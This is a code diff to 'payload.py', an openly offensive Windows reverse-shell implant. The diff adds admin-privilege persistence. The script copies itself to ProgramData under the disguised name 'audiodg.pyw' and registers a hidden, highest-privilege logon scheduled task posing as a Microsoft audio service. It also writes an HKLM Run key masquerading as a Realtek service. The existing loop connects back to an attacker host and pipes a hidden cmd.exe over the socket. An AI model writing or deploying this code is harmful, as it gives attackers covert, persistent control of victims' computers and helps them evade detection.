@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, granted True Sight to bypass all obstacles.
+# The Heartbeat Soul, granted True Sight and Admin Elevation.
 
 import os
 import sys
@@ -19,6 +19,112 @@ RPORT = ##RPORT##
 # --------------------
 
 FILE_PORT = RPORT + 1
+
+# --- ADMIN DETECTION & PERSISTENCE ---
+def is_admin():
+    """Check if running with admin privileges."""
+    try:
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+
+def install_admin_persistence():
+    """If we're running as admin, install full persistence."""
+    try:
+        if not is_admin():
+            return
+
+        PROGRAMDATA_PATH = os.getenv('PROGRAMDATA')
+        TASK_NAME = "MicrosoftWindowsAudioDeviceHighDefinitionService"
+        PERSISTENT_NAME = "audiodg.pyw"
+        PERSISTENT_PATH = os.path.join(PROGRAMDATA_PATH, "Microsoft", "Windows", "AudioService", PERSISTENT_NAME)
+
+        # Copy ourselves to the protected location
+        current_path = os.path.abspath(sys.argv[0])
+        if current_path != PERSISTENT_PATH:
+            os.makedirs(os.path.dirname(PERSISTENT_PATH), exist_ok=True)
+            with open(current_path, 'rb') as src:
+                with open(PERSISTENT_PATH, 'wb') as dst:
+                    dst.write(src.read())
+
+        # Create scheduled task with HIGHEST privileges
+        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Windows Audio Device High Definition Service</Description>
+    <Author>Microsoft Corporation</Author>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
+    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>pythonw.exe</Command>
+      <Arguments>"{PERSISTENT_PATH}"</Arguments>
+    </Exec>
+  </Actions>
+</Task>'''
+
+        xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
+        with open(xml_path, 'w', encoding='utf-16') as f:
+            f.write(xml_template)
+
+        subprocess.run(
+            ['schtasks', '/Create', '/TN', TASK_NAME, '/XML', xml_path, '/F'],
+            capture_output=True,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+
+        os.remove(xml_path)
+
+        # Also add HKLM registry persistence
+        import winreg
+        registry_key = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE,
+            r'Software\Microsoft\Windows\CurrentVersion\Run',
+            0,
+            winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
+        )
+        command = f'pythonw.exe "{PERSISTENT_PATH}"'
+        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
+        winreg.CloseKey(registry_key)
+
+    except Exception:
+        pass
+
+# Install persistence if we have admin
+install_admin_persistence()
+# -----------------------------------
 
 def send_msg(sock, data):
     """Wraps data with a 4-byte length header and sends it."""
@@ -159,13 +265,20 @@ def handle_pfiler_command(command, main_conn):
             pass
 
 def run_conduit():
-    """Main reverse shell loop."""
+    """Main reverse shell loop with admin cmd.exe."""
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
-            
-            p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
+
+            # Launch cmd.exe - if we're admin, this is an admin shell
+            p = subprocess.Popen(
+                ["cmd.exe"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                creationflags=0x08000000  # CREATE_NO_WINDOW
+            )
             
             stop_event = threading.Event()
             def pipe_stream(stream, sock):
